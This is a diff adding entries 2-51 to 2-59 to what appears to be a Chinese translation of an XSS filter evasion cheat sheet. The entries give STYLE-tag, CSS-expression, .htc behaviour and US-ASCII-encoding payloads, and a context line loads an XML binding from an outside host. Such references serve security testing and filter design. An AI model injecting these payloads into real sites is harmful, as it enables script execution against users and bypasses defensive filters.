@@ -336,7 +336,76 @@ IE 渲染引擎不像 Firefox，不会向页面中添加额外数据。但它允
 
 `<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>`
 
-### 2-51
+### 2-51 含有分隔 JavaScript 的STYLE标签
+
+这个 XSS 会在 IE 中造成无限循环:
+
+```html
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+```
+
+### 2-52 STYLE 属性中使用注释分隔表达式
+
+由 Roman Ivanov 创建
+
+```html
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+```
+
+### 2-53 含有表达式的IMG标签的STYLE属性
+
+这是一个将上面 XSS 攻击向量混合的方法，但确实展示了 STYLE 标签可以用相当复杂的方式分隔，和上面一样，也会让 IE 进入死循环:
+
+```html
+exp/*<A STYLE='no\xss:noxss("*//*");
+xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
+```
+
+### 2-54 STYLE标签（仅旧版本Netscape可用）
+
+```html
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+```
+
+### 2-55 使用背景图像的STYLE标签
+
+```html
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+```
+
+### 2-56 使用背景的STYLE标签
+
+```html
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+```
+
+```html
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+```
+
+### 2-57 含有STYLE属性的任意HTML标签
+
+IE6.0 和 IE 渲染引擎模式下的 Netscape 8.1+并不关心你建立的 HTML 标签是否存在，只要是由尖括号和字母开始的即可:
+
+```html
+<XSS STYLE="xss:expression(alert('XSS'))">
+```
+
+### 2-58 本地htc文件
+
+这和上面两个跨站脚本攻击向量有些不同，因为它使用了一个必须和 XSS 攻击向量在相同服务器上的.htc 文件。这个示例文件通过下载 JavaScript 并将其作为 style 属性的一部分运行来进行攻击：
+
+```html
+<XSS STYLE="behavior: url(xss.htc);">
+```
+
+### 2-59 US-ASCII encoding
+
+US-ASCII 编码（由 Kurt Huwig 发现）。它使用了畸形的 7 位 ASCII 编码来代替 8 位。这 个 XSS 攻击向量可以绕过大多数内容过滤器，但是只在主机使用 US-ASCII 编码传输数据时有效，或者可以自己设置编码格式。相对绕过服务器端过滤，这在绕过 WAF 跨站脚本过滤时候更有效。Apache Tomcat 是目前唯一已知使用 US-ASCII 编码传输的：
+
+```html
+¼script¾alert(¢XSS¢)¼/script¾
+```
 
 ### 2-60 META
 
